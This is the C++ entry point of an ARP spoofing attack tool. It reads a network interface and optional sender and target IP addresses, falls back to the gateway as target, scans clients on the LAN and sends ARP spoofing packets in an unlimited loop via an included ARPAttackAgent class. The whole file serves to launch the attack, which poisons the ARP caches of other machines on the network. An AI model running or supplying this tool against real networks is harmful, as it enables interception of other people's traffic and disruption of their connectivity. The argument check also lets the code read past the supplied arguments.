#include <iostream>
#include "network/NetTools.cpp"
#include "network/ARPAttackAgent.cpp"


int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "WARNING: Failed load network protocol..." << std::endl;
        return 1;
    } else std::cout << "INFO: network interface at " << argv[1] << std::endl;

    char* netInterface = argv[1];
    auto senderIP = NetTools::strToIP(argv[2]);
    auto targetIp = NetTools::strToIP(argv[3]);

    if (!targetIp) {
        std::cout << "INFO: Target-ip setting-up as gateway...." << std::endl;
        targetIp = NetTools::findGateway();
    }
    if (!senderIP) std::cout << "WARNING: Broadcast ARP spoofing attack...." << std::endl;

    auto arpAttackAgent = ARPAttackAgent(netInterface, targetIp.value(), senderIP);
    arpAttackAgent.scanClients();
    arpAttackAgent.sendARPAttack(ARPAttackAgent::UNLIMITED);
}
